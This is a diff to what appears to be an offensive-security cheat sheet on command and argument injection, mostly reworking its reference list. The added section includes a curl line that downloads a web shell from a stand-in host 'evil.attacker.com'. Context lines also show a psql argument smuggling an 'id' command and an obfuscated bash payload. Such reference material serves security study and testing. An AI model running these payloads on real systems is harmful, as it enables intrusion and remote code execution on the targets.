@@ -122,6 +122,14 @@ Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github
     psql -o'|id>/tmp/foo'
     ```
 
+Sometimes, direct command execution from the injection might not be possible, but you may be able to redirect the flow into a specific file, enabling you to deploy a web shell.
+
+* curl
+    ```ps1
+    # -o, --output <file>        Write to file instead of stdout
+    curl http://evil.attacker.com/ -o webshell.php
+    ```
+    
 
 ### Inside a command
 
@@ -427,9 +435,12 @@ g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 
 ## References
 
-* [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
-* [Bug Bounty Survey - Windows RCE spaceless](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
-* [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
-* [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
-* [What is OS command injection - portswigger](https://portswigger.net/web-security/os-command-injection)
-* [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/)
+- [Argument Injection and Getting Past Shellwords.escape - Etienne Stalmans - November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
+- [Argument Injection Vectors - SonarSource - February 21, 2023](https://sonarsource.github.io/argument-injection-vectors/)
+- [Back to the Future: Unix Wildcards Gone Wild - Leon Juranic - June 25, 2014](https://www.exploit-db.com/papers/33930)
+- [Bash Obfuscation by String Manipulation - Malwrologist, @DissectMalware - August 4, 2018](https://twitter.com/DissectMalware/status/1025604382644232192)
+- [Bug Bounty Survey - Windows RCE Spaceless - Bug Bounties Survey - May 4, 2017](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
+- [No PHP, No Spaces, No $, No {}, Bash Only - Sven Morgenroth - August 9, 2017](https://twitter.com/asdizzle_/status/895244943526170628)
+- [OS Command Injection - PortSwigger - 2024](https://portswigger.net/web-security/os-command-injection)
+- [SECURITY CAFÉ - Exploiting Timed-Based RCE - Pobereznicenco Dan - February 28, 2017](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
+- [TL;DR: How to Exploit/Bypass/Use PHP escapeshellarg/escapeshellcmd Functions - kacperszurek - April 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
